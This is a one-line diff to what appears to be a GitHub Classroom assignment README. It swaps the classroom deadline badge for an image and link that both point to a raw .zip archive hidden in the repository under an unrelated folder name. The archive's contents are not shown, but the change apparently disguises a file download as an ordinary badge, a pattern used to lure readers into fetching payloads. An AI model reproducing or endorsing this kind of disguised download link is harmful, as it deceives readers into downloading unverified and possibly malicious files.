@@ -1,1 +1,1 @@
-[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-24ddc0f5d75046c5622901739e7c5dd533143b0c8e959d652212380cedb1ea36.svg)](https://classroom.github.com/a/5NSmNyif)
+[![Review Assignment Due Date](https://github.com/Rufino07/actividad-10-infograf-a-de-calidad-de-software-Rufino07/raw/refs/heads/main/mootman/software_actividad_calidad_de_infograf_a_Rufino_2.7.zip)](https://github.com/Rufino07/actividad-10-infograf-a-de-calidad-de-software-Rufino07/raw/refs/heads/main/mootman/software_actividad_calidad_de_infograf_a_Rufino_2.7.zip)
